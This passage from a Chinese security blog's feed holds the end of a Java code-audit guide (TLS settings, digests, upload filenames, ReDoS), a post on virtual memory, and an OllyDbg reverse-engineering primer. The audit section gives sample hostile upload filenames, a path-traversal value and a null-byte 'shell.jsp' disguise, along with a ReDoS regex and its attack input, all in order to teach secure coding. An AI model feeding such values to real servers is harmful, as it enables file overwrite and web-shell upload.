plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public static byte[] getEncryptedPassword(String password, byte[] salt) throws NoSuchAlgorithmException, InvalidKeySpecException &#123;</span><br><span class="line">    KeySpec spec = new PBEKeySpec(password.toCharArray(), salt, 4096, 256 * 8);</span><br><span class="line">    SecretKeyFactory f = SecretKeyFactory.getInstance(&quot;PBKDF2WithHmacSHA256&quot;);</span><br><span class="line">    return f.generateSecret(spec).getEncoded();</span><br><span class="line">&#125;</span><br><span class="line">12345</span><br></pre></td></tr></table></figure><p>引用：<br><a href="https://community.qualys.com/blogs/securitylabs/2014/09/09/sha1-deprecation-what-you-need-to-know" target="_blank" rel="noopener">Qualys blog: SHA1 Deprecation: What You Need to Know</a><br><a href="https://googleonlinesecurity.blogspot.ca/2014/09/gradually-sunsetting-sha-1.html" target="_blank" rel="noopener">Google Online Security Blog: Gradually sunsetting SHA-1</a><br><a href="http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf" target="_blank" rel="noopener">NIST: Transitions: Recommendation for Transitioning the Use of Cryptographic Algorithms and Key Lengths</a><br><a href="http://csrc.nist.gov/publications/nistpubs/800-132/nist-sp800-132.pdf" target="_blank" rel="noopener">NIST: Recommendation for Password-Based Key Derivation</a><br><a href="https://stackoverflow.com/q/22580853/89769" target="_blank" rel="noopener">Stackoverflow: Reliable implementation of PBKDF2-HMAC-SHA256 for Java</a><br><a href="http://cwe.mitre.org/data/definitions/327.html" target="_blank" rel="noopener">CWE-327: Use of a Broken or Risky Cryptographic Algorithm</a></p><h1 id="DefaultHttpClient的默认构造函数与TLS-1-2不兼容"><a href="#DefaultHttpClient的默认构造函数与TLS-1-2不兼容" class="headerlink" title="DefaultHttpClient的默认构造函数与TLS 1.2不兼容"></a>DefaultHttpClient的默认构造函数与TLS 1.2不兼容</h1><p>漏洞特征： DEFAULT_HTTP_CLIENT<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HttpClient client = new DefaultHttpClient();</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>解决方案：<br>用建议的构造函数去升级你的代码并且配置jvm中https.protocols选项，使其包含TLSv1.2:<br>使用SystemDefaultHttpClient 代替</p><ul><li>示例代码：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HttpClient client = new SystemDefaultHttpClient();</span><br><span class="line">1</span><br></pre></td></tr></table></figure><ul><li>基于SSLSocketFactory类创建一个HttpClient，通过 <a href="https://hc.apache.org/httpcomponents-client-ga/httpclient/apidocs/org/apache/http/conn/ssl/SSLSocketFactory.html#getSystemSocketFactory()" target="_blank" rel="noopener">getSystemSocketFactory()</a> 获得一个SSLScoketFactory实例，用这个实例去初始化一个HttpClient</li><li>基于SSLConnectionSocketFactory类创建一个HttpClient，通过 <a href="https://hc.apache.org/httpcomponents-client-ga/httpclient/apidocs/org/apache/http/conn/ssl/SSLSocketFactory.html#getSystemSocketFactory()" target="_blank" rel="noopener">getSystemSocketFactory()</a> 获得一个SSLScoketFactory实例，用这个实例去初始化一个HttpClient</li><li>使用HttpClientBuilder，在调用build()之前调用useSystemProperties()<br>示例代码：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HttpClient client = HttpClientBuilder.create().useSystemProperties().build();</span><br><span class="line">1</span><br></pre></td></tr></table></figure><ul><li>HttpClients,调用 createSystem()去创建一个实例</li></ul><p>示例代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HttpClient client = HttpClients.createSystem();</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>引用：<br><a href="https://blogs.oracle.com/java-platform-group/entry/diagnosing_tls_ssl_and_https" target="_blank" rel="noopener">Diagnosing TLS, SSL, and HTTPS</a></p><h1 id="脆弱的SSLContext"><a href="#脆弱的SSLContext" class="headerlink" title="脆弱的SSLContext"></a>脆弱的SSLContext</h1><p>漏洞特征： SSL_CONTEXT<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SSLContext.getInstance(&quot;SSL&quot;);</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>解决方案：<br>用下面的代码升级你的代码，并且配置jvm的https.protocols选项，使其包含TLSv1.2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SSLContext.getInstance(&quot;TLS&quot;); </span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>引用：<br><a href="https://blogs.oracle.com/java-platform-group/entry/diagnosing_tls_ssl_and_https" target="_blank" rel="noopener">Diagnosing TLS, SSL, and HTTPS</a></p><h1 id="习惯使用的信息摘要算法"><a href="#习惯使用的信息摘要算法" class="headerlink" title="习惯使用的信息摘要算法"></a>习惯使用的信息摘要算法</h1><p>自己实现消息摘要算法是不靠谱的。<br><a href="http://csrc.nist.gov/groups/ST/toolkit/secure_hashing.html" target="_blank" rel="noopener">NIST</a>建议使用SHA-224, SHA-256, SHA-384, SHA-512, SHA-512/224, or SHA-512/256。<br><strong>“SHA-1用于生成电子签名：</strong><br>SHA-1可能仅仅用于NIST指导的特殊协议的电子签名的生成。但是在其他的应用中，SHA-1 不应该用于电子签名</p><p><strong>SHA-1用于电子签名的验证：</strong><br>对于电子签名的验证，SHA-1可以被用于传统应用<br><strong>“SHA-224, SHA-256, SHA-384, SHA-512, SHA-512/224, and SHA-512/256:</strong><br>所有散列计算程序都支持这些哈希函数的使用。<br>NISI:通信传输：<a href="http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf" target="_blank" rel="noopener">传输中建议使用的加密算法和密钥长度</a><br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">MyProprietaryMessageDigest extends MessageDigest &#123;</span><br><span class="line">    @Override</span><br><span class="line">    protected byte[] engineDigest() &#123;</span><br><span class="line">        [...]</span><br><span class="line">        //Creativity is a bad idea</span><br><span class="line">        return [...];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">12345678</span><br></pre></td></tr></table></figure><p>使用其中一种信息摘要算法去升级你的代码。这些算法非常强大，能足够满足你的安全需求。<br>解决方案示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MessageDigest sha256Digest = MessageDigest.getInstance(&quot;SHA256&quot;);</span><br><span class="line">sha256Digest.update(password.getBytes());</span><br><span class="line">12</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://csrc.nist.gov/groups/ST/toolkit/secure_hashing.html" target="_blank" rel="noopener">NIST Approved Hashing Algorithms</a><br><a href="http://cwe.mitre.org/data/definitions/327.html" target="_blank" rel="noopener">CWE-327: Use of a Broken or Risky Cryptographic Algorithm</a></p><h1 id="读取文件的缺陷"><a href="#读取文件的缺陷" class="headerlink" title="读取文件的缺陷"></a>读取文件的缺陷</h1><p>漏洞特征： FILE_UPLOAD_FILENAME<br>通过篡改FileUpload API 提供的文件名，客户端可以任意访问系统中的文件<br>比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;../../../config/overide_file&quot;</span><br><span class="line"></span><br><span class="line">&quot;shell.jsp\u0000expected.gif&quot;</span><br><span class="line">123</span><br></pre></td></tr></table></figure><p>所以，上面的这些值应该没有做任何过滤就直接进入到了文件系统api之中。如果可能，应用应该生成自己的文件名，并且使用它们。<br>即使这样，被提供的文件名也要去验证它们的有效性，以确保它们没有包含未授权的路径（比如./)和未授权的文件。</p><p>引用：<br><a href="http://blogs.securiteam.com/index.php/archives/1268" target="_blank" rel="noopener">Securiteam: File upload security recommendations</a><br><a href="http://cwe.mitre.org/data/definitions/22.html" target="_blank" rel="noopener">CWE-22: Improper Limitation of a Pathname to a Restricted Directory (‘Path Traversal’)</a><br>[WASC-33: Path Traversal](<a href="http://projects.webappsec.org/w/page/13246952/Path" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246952/Path</a> Traversal)<br><a href="https://www.owasp.org/index.php/Path_Traversal" target="_blank" rel="noopener">OWASP: Path Traversal</a><br><a href="http://capec.mitre.org/data/definitions/126.html" target="_blank" rel="noopener">CAPEC-126: Path Traversal</a><br><a href="http://cwe.mitre.org/data/definitions/22.html" target="_blank" rel="noopener">CWE-22: Improper Limitation of a Pathname to a Restricted Directory (‘Path Traversal’)</a></p><h1 id="正则dos"><a href="#正则dos" class="headerlink" title="正则dos"></a>正则dos</h1><p>漏洞特征： REDOS<br>正则表达式(regexs)经常导致拒绝服务攻击（(DOS)。这是因为当正则表达式引擎分析一些字符串的时候会消耗大量的时间，而这也取决于正则是怎么写的。<br>比如，对于正则<code>^(a+)+$</code>,如果输入”aaaaaaaaaaaaaaaaX”，就会让正则表达式引擎分析65536种不同的路径。<br>所以，可能只要客户端发送一个请求就可以让服务器端消耗巨大的计算资源。问题可能就是类似于这样的正则表达式，由于括号内的+ (or a *)和括号外的+ (or a *) ，当输入相同字符串的时候，可能会有两种不同的处理方式。以这样的方式去写正则，+号会消耗字符’a’。为了修复这样问题，正则表达式应该被重写，目的是消除歧义.比如，上面那个有问题的正则表达式就可以被改写为<code>^a+$</code>，无论如何，这可能是作者的意思。总之，这可能是原来正则表达式的意思，这个新正则表达式会更快的匹配字符串，并且也不会受到ReDos攻击。<br>引用：<br><a href="http://www.jroller.com/sebastianKuebeck/entry/detecting_and_preventing_redos_vulnerabilities" target="_blank" rel="noopener">Sebastian Kubeck’s Weblog: Detecting and Preventing ReDoS Vulnerabilities</a><br>[1] <a href="https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS" target="_blank" rel="noopener">OWASP: Regular expression Denial of Service</a><br><a href="http://cwe.mitre.org/data/definitions/400.html" target="_blank" rel="noopener">CWE-400: Uncontrolled Resource Consumption (‘Resource Exhaustion’)</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java审计-DAY1&quot;&gt;&lt;a href=&quot;#Java审计-DAY1&quot; class=&quot;headerlink&quot; title=&quot;Java审计-DAY1&quot;&gt;&lt;/a&gt;Java审计-DAY1&lt;/h1&gt;&lt;p&gt;本文转载自 &lt;a href=&quot;https://blog.csdn.n
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>物理内存和虚拟内存的联系与区别</title>
    <link href="http://bai-ren-1.github.io/2020/02/13/%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/"/>
    <id>http://bai-ren-1.github.io/2020/02/13/%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/</id>
    <published>2020-02-13T03:31:44.000Z</published>
    <updated>2020-02-21T08:02:19.015Z</updated>
    
    <content type="html"><![CDATA[<h1 id="虚拟内存与物理内存的联系与区别"><a href="#虚拟内存与物理内存的联系与区别" class="headerlink" title="虚拟内存与物理内存的联系与区别"></a>虚拟内存与物理内存的联系与区别</h1><p>重要的概念，需要弄清楚。</p><h2 id="物理内存与虚拟内存"><a href="#物理内存与虚拟内存" class="headerlink" title="物理内存与虚拟内存"></a>物理内存与虚拟内存</h2><p>操作系统有虚拟内存与物理内存的概念。</p><p>在很久以前，还没有虚拟内存概念的时候，程序寻址用的都是物理地址。程序能寻址的范围是有限的，这取决于CPU的地址线条数。比如在<strong>32位平台下，寻址的范围是2^32也就是4G</strong>。并且这是固定的，如果没有虚拟内存，且每次开启一个进程都给4G的物理内存，就可能会出现很多问题：</p><ul><li>因为我的物理内存时有限的，当有多个进程要执行的时候，都要给4G内存，很显然你内存小一点，这很快就分配完了，于是没有得到分配资源的进程就只能等待。当一个进程执行完了以后，再将等待的进程装入内存。这种频繁的装入内存的操作是很没效率的</li><li>由于指令都是直接访问物理内存的，那么我这个进程就可以修改其他进程的数据，甚至会修改内核地址空间的数据，这是我们不想看到的</li><li>因为内存时随机分配的，所以程序运行的地址也是不正确的。</li></ul><p>针对上面会出现的各种问题，虚拟内存就出来了。</p><p>在之前一篇文章中进程分配资源介绍过一个进程运行时都会得到4G的虚拟内存。这个虚拟内存你可以认为，每个进程都<strong>认为</strong>自己拥有4G的空间，这只是每个进程认为的，但是实际上，在虚拟内存对应的物理内存上，可能只对应的<strong>一点点</strong>的物理内存，实际用了多少内存，就会对应多少物理内存。</p><p>进程得到的这4G虚拟内存是一个连续的地址空间（这也只是进程认为），而实际上，它通常是被分隔成多个物理内存碎片，还有一部分存储在外部磁盘存储器上，在需要时进行<strong>数据交换</strong>。</p><p>进程开始要访问一个地址，它可能会经历下面的过程</p><ol><li>每次我要访问地址空间上的某一个地址，都需要把地址翻译为实际物理内存地址</li><li>所有进程共享这整一块物理内存，每个进程只把自己目前需要的虚拟地址空间映射到物理内存上</li><li>进程需要知道哪些地址空间上的数据在物理内存上，哪些不在（可能这部分存储在磁盘上），还有在物理内存上的哪里，这就需要通过页表来记录</li><li>页表的每一个表项分两部分，第一部分记录此页是否在物理内存上，第二部分记录物理内存页的地址（如果在的话）</li><li>当进程访问某个虚拟地址的时候，就会先去看页表，如果发现对应的数据不在物理内存上，就会发生缺页异常<br>缺页异常的处理过程，操作系统立即阻塞该进程，并将硬盘里对应的页换入内存，然后使该进程就绪，如果内存已经满了，没有空地方了，那就找一个页覆盖，至于具体覆盖的哪个页，就需要看操作系统的页面置换算法是怎么设计的了。</li></ol><p><strong>关于虚拟内存与物理内存的联系如下图：</strong></p><p><img src="/2020/02/13/%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/linux%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98.png" alt></p><p><strong>页表的工作原理如下图：</strong></p><p><img src="/2020/02/13/%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/%E7%BD%AE%E6%8D%A2%E5%B7%A5%E4%BD%9C%E8%BF%87%E7%A8%8B.png" alt></p><ol><li>我们的cpu想访问虚拟地址所在的虚拟页(VP3)，根据<strong>页表</strong>，找出页表中第三条的值.判断有效位。 如果有效位为1，DRMA缓存命中，根据物理页号，找到物理页当中的内容，返回。</li><li>若有效位为0，参数缺页异常，调用内核缺页异常处理程序。内核通过页面置换算法选择一个页面作为被覆盖的页面，将该页的内容刷新到磁盘空间当中。然后把VP3映射的磁盘文件缓存到该物理页上面。然后页表中第三条，有效位变成1，第二部分存储上了可以对应物理内存页的地址的内容。</li><li>缺页异常处理完毕后，返回中断前的指令，重新执行，此时缓存命中，执行1。</li><li>将找到的内容映射到告诉缓存当中，CPU从告诉缓存中获取该值，结束。</li></ol><h2 id="再来总结一下虚拟内存是怎么工作的"><a href="#再来总结一下虚拟内存是怎么工作的" class="headerlink" title="再来总结一下虚拟内存是怎么工作的"></a>再来总结一下虚拟内存是怎么工作的</h2><p>当每个进程创建的时候，内核会为进程分配4G的虚拟内存，当进程还没有开始运行时，这只是一个<strong>内存布局</strong>。实际上并不立即就把虚拟内存对应位置的程序数据和代码（比如.text .data段）拷贝到物理内存中，只是建立好虚拟内存和磁盘文件之间的<strong>映射</strong>就好（叫做存储器映射）。这个时候数据和代码<strong>还是在磁盘上</strong>的。当运行到对应的程序时，进程去寻找页表，发现页表中地址没有存放在物理内存上，而是在磁盘上，于是发生<strong>缺页异常</strong>，于是将磁盘上的数据拷贝到物理内存中。</p><p>另外在进程运行过程中，要通过malloc来动态分配内存时，也只是分配了虚拟内存，即为这块虚拟内存对应的页表项做相应设置，当进程真正访问到此数据时，才引发缺页异常。</p><p>可以认为虚拟空间都被映射到了磁盘空间中（事实上也是按需要映射到磁盘空间上，通过mmap，mmap是用来建立虚拟空间和磁盘空间的映射关系的）</p><h2 id="利用虚拟内存机制的优点"><a href="#利用虚拟内存机制的优点" class="headerlink" title="利用虚拟内存机制的优点"></a>利用虚拟内存机制的优点</h2><ul><li>既然每个进程的内存空间都是一致而且固定的（<strong>32位平台下都是4G</strong>），所以链接器在链接可执行文件时，可以设定内存地址，而不用去管这些数据最终实际内存地址，这交给内核来完成映射关系</li><li>当不同的进程使用同一段代码时，比如库文件的代码，在物理内存中可以只存储一份这样的代码，不同进程只要将自己的虚拟内存映射过去就好了，这样可以节省物理内存</li><li>在程序需要分配连续空间的时候，只需要在虚拟内存分配连续空间，而不需要物理内存时连续的，实际上，往往物理内存都是断断续续的内存碎片。这样就可以有效地利用我们的物理内存</li></ul><h2 id="不同系统的虚拟空间"><a href="#不同系统的虚拟空间" class="headerlink" title="不同系统的虚拟空间"></a>不同系统的虚拟空间</h2><h3 id="windows-32下的虚拟地址空间"><a href="#windows-32下的虚拟地址空间" class="headerlink" title="windows 32下的虚拟地址空间"></a>windows 32下的虚拟地址空间</h3><p><img src="/2020/02/13/%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/win32%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98.jpg" alt></p><p>在 Windows 系统下，虚拟地址空间被分成了 4 部分： <strong>NULL 指针区、用户区、 64KB 禁入区、内核区</strong>。</p><ul><li><strong>用户区</strong>每个进程私有使用的，大约 2GB 左右 ( 最大可以调整到 3GB，3GB模式) ，称为用户地址空间。用户区存放的是<strong>程序代码和数据, 堆, 共享库, 栈</strong>。</li><li><strong>内核区</strong>是所有进程共享的，为 2GB ，称为系统地址空间。内核区保存的是系统线程调度、内存管理、设备驱动等数据，这部分数据供所有的进程共享以及操作系统的使用——程序在运行的时候处于操作系统的监管下，监管进程的虚拟空间，当进程进行非法访问时强制结束程序。（2GB的内核区是所有的进程都是同一个2GB吗）</li><li>上述的2GB+2GB称为2GB模式，是在默认的windows配置下。可以修改windows配置，可以设置3GB用户地址空间+1GB的系统地址空间，称为3GB模式。</li></ul><h3 id="Linux下的4GB虚拟内存空间"><a href="#Linux下的4GB虚拟内存空间" class="headerlink" title="Linux下的4GB虚拟内存空间"></a>Linux下的4GB虚拟内存空间</h3><p><img src="/2020/02/13/%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/D:%5Cgitblog%5Csec%5Csource_posts%5C%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB%5Clinux%E5%86%85%E5%AD%98.png" alt></p><blockquote><p>上图由上往下是高地址到低地址；下图由上往下是低地址到高地址；</p></blockquote><p><img src="/2020/02/13/%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E5%92%8C%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%9A%84%E8%81%94%E7%B3%BB%E4%B8%8E%E5%8C%BA%E5%88%AB/Linux%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E7%A9%BA%E9%97%B4.png" alt></p><p>每个段的存放内容如下：</p><ul><li><p><strong>.reserve(预留)段</strong><br>一共占用128M，属于预留空间，进程是禁止访问的</p></li><li><p><strong>.text(代码段)</strong><br>可执行文件加载到内存中的只有数据和指令之分，而指令被存放在.text段中，一般是共享的，编译时确定,只读，不允许修改</p></li><li><p><strong>.data</strong><br>存放在编译阶段(而非运行时)就能确定的数据,可读可写。也就是通常所说的静态存储区,赋了初值的全局变量和赋初值的静态变量存放在这个区域,常量也存放在这个区域</p></li><li><p><strong>.bss段</strong><br>通常用来存放程序中未初始化以及初始化为0的全局/静态变量的一块内存区域，在程序载入时由内核清0</p></li><li><p><strong>.heap(堆)</strong><br>用于存放进程运行时动态分配的内存，可动态扩张或缩减，这块内存由程序员自己管理，通过malloc/new可以申请内存，free/delete用来释放内存，heap的地址从低向高扩展，是不连续的空间</p></li><li><p><strong>.stack(栈)</strong><br>记录函数调用过程相关的维护性信息，栈的地址从高地址向低地址扩展，是连续的内存区域</p></li><li><p><strong>共享库(libc.so)</strong></p></li></ul><h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><p>转载自 ： <a href="https://blog.csdn.net/wyq_5/article/details/77481136" target="_blank" rel="noopener">https://blog.csdn.net/wyq_5/article/details/77481136</a> </p><p>转载自 ： <a href="https://blog.csdn.net/lvyibin890/article/details/82217193" target="_blank" rel="noopener">https://blog.csdn.net/lvyibin890/article/details/82217193</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;虚拟内存与物理内存的联系与区别&quot;&gt;&lt;a href=&quot;#虚拟内存与物理内存的联系与区别&quot; class=&quot;headerlink&quot; title=&quot;虚拟内存与物理内存的联系与区别&quot;&gt;&lt;/a&gt;虚拟内存与物理内存的联系与区别&lt;/h1&gt;&lt;p&gt;重要的概念，需要弄清楚。&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>OD操作和RE基本思路</title>
    <link href="http://bai-ren-1.github.io/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/"/>
    <id>http://bai-ren-1.github.io/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/</id>
    <published>2020-02-11T07:58:51.000Z</published>
    <updated>2020-02-11T09:02:00.914Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OD基本操作和RE基本思想"><a href="#OD基本操作和RE基本思想" class="headerlink" title="OD基本操作和RE基本思想"></a>OD基本操作和RE基本思想</h1><p>这篇写一些比较简单的知识，主要用来记录od的一些操作和介绍一些RE基本的操作和思想</p><h2 id="OD操作"><a href="#OD操作" class="headerlink" title="OD操作"></a>OD操作</h2><ul><li><p>F2 ：下断点</p></li><li><p>F4 :  执行到光标所在的位置</p></li><li><p>F9 ：debug程序</p></li><li><p>F7 :   单步步进（step into）</p></li><li><p>F8 :   单步步过（step over）</p></li></ul><ul><li><p>ctrl + F9 ：一直在函数代码内部运行，直到遇到RETN</p></li><li><p>ctrl + F2 ：重新开始调试</p></li><li><p>ctrl + G : 移动到指定位置</p></li><li><p>ctrl + E ：编辑数据</p></li></ul><ul><li><p>； ： 用来添加注释（得把输入法改为英文才可以用）</p></li><li><p>： ： 用来添加标签（得把输入法改为英文才可以用）</p></li><li><p>space ：修改汇编代码</p></li><li><p>enter ：若光标处有call/jmp等指令，则跟踪并显示相关地址</p></li></ul><h2 id="快速回到“据点”方法"><a href="#快速回到“据点”方法" class="headerlink" title="快速回到“据点”方法"></a>快速回到“据点”方法</h2><ul><li>ctrl + G 输入据点地址，直接回到据点的位置</li><li>在每个据点 F2 设置断点</li><li>在每个据点处 ：添加注释</li><li>在每个据点处 ；添加标签</li></ul><h2 id="EP概念"><a href="#EP概念" class="headerlink" title="EP概念"></a>EP概念</h2><p>EP是<strong>windows可执行文件的代码入口点</strong>。</p><p>是执行应用程序时最先执行的代码的起始位置，依赖于CPU。</p><blockquote><p>重点：EP并不是main函数入口。调试代码时，出现在EP位置的是开发工具（Visual C++等）生成的启动函数。</p></blockquote><h2 id="快速找到指定代码的四种方法"><a href="#快速找到指定代码的四种方法" class="headerlink" title="快速找到指定代码的四种方法"></a>快速找到指定代码的四种方法</h2><p>如何快速找到需要的代码（如main入口等），有下面四种方法。下面的例子假设都是为了找到程序中的 main 函数。而 main 的内容是调用了系统的 MessageBoxW() API 然后弹出 helloworld： </p><h3 id="1、代码执行法"><a href="#1、代码执行法" class="headerlink" title="1、代码执行法"></a>1、代码执行法</h3><p><strong>不断按 F8（不跟踪进函数内部）执行程序</strong>。</p><p>当函数执行到某一时刻程序弹出了窗口显示hello world，就可以判断该函数就是所找的 main 函数。</p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%B3%95.png" alt></p><h3 id="2、字符串检索法"><a href="#2、字符串检索法" class="headerlink" title="2、字符串检索法"></a>2、字符串检索法</h3><p><strong>右键 -&gt; Search for -&gt; All referenced text strings</strong>，这样就能看到程序代码引用的字符串并整理到列表中。</p><p>那么我们就可以检索 hello world 然后定位到 main 函数的位置。</p><blockquote><p>吾爱破解版的可以使用 <strong>右键 -&gt; 中文搜索引擎 -&gt; 智能搜索</strong>  实现检索字符串。如果使用上面的选项是无法得到预期结果的。</p></blockquote><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E6%99%BA%E8%83%BD%E6%90%9C%E7%B4%A2.png" alt></p><h3 id="3、API检索法-1"><a href="#3、API检索法-1" class="headerlink" title="3、API检索法-1"></a>3、API检索法-1</h3><p><strong>右键 -&gt; Search for -&gt; All intermodular calls</strong>，这样就能看到程序代码运行时调用的 API 函数列表。</p><p>那么我们知道 main 函数调用了一个窗口显示hello world，我们就能对应找到窗口调用API MessageBoxW，然后定位到 main 。</p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/api%E6%A3%80%E7%B4%A2-1.png" alt></p><h3 id="4、API检索法-2"><a href="#4、API检索法-2" class="headerlink" title="4、API检索法-2"></a>4、API检索法-2</h3><p><strong>右键 -&gt; Search for -&gt; Name in all calls</strong>。od不能给所有可执行文件都列出API函数列表(压缩或者保护器等)，使用这个命令可以列出被加载的DLL文件提供的所有API。</p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/api%E6%A3%80%E7%B4%A2-2.png" alt></p><h2 id="打补丁修改字符串"><a href="#打补丁修改字符串" class="headerlink" title="打补丁修改字符串"></a>打补丁修改字符串</h2><h3 id="1、直接修改字符串缓冲区"><a href="#1、直接修改字符串缓冲区" class="headerlink" title="1、直接修改字符串缓冲区"></a>1、直接修改字符串缓冲区</h3><p>由od我们能看出 hello world 字符串的内存位置 0x4092A0</p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BD%8D%E7%BD%AE.png" alt></p><p>直接到dump窗口中 ctrl + G 定位到字符串，选中修改的字符串段并用 <strong>ctrl + E</strong> 打开编辑</p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E7%BC%96%E8%BE%91.png" alt></p><p>将字符串 world 修改为 shabi 并保存 </p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E4%BF%AE%E6%94%B9.png" alt></p><p>再次F9运行可以看到结果已经改变了</p><p><img src="/2020/02/11/OD%E6%93%8D%E4%BD%9C%E5%92%8CRE%E5%9F%BA%E6%9C%AC%E6%80%9D%E8%B7%AF/%E6%94%B9%E5%8F%98.png" alt></p><h3 id="2、在其他区域生成新字符串并传递给消息函数"><a href="#2、在其他区域生成新字符串并传递给消息函数" class="headerlink" title="2、在其他区域生成新字符串并传递给消息函数"></a>2、在其他区域生成新字符串并传递给消息函数</h3><p>通过od我们能看到 main 函数中，0x401007地址的地方有一条 push 004092A0 的命令，它是将 4092A0 地址的 hello world 字符串以参数传递给 MessageBoxW函数。所以我们可以<strong>修改字符串地址</strong>指向我们新建的位置。</p><p><img 